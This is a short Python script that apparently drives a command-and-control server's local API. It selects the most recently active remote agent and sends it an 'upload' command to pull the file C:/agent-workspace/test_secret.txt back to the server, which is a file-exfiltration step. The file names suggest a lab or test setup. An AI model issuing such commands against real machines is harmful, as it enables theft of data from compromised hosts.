import urllib.request
import json

resp = urllib.request.urlopen('http://127.0.0.1:8443/api/agents')
data = json.loads(resp.read())
guids = [k for k in data if len(k) > 10 and not k.lower().startswith('test')]
guids.sort(key=lambda k: data[k].get('last_seen') or '')
guid = guids[-1]

cmd = r"upload C:/agent-workspace/test_secret.txt"
print("Sending to", guid, "cmd:", repr(cmd))
req = urllib.request.Request(
    f"http://127.0.0.1:8443/api/agents/{guid}/command",
    data=json.dumps({"cmd": cmd}).encode(),
    headers={"Content-Type": "application/json"}
)
resp = urllib.request.urlopen(req)
print(resp.read().decode())

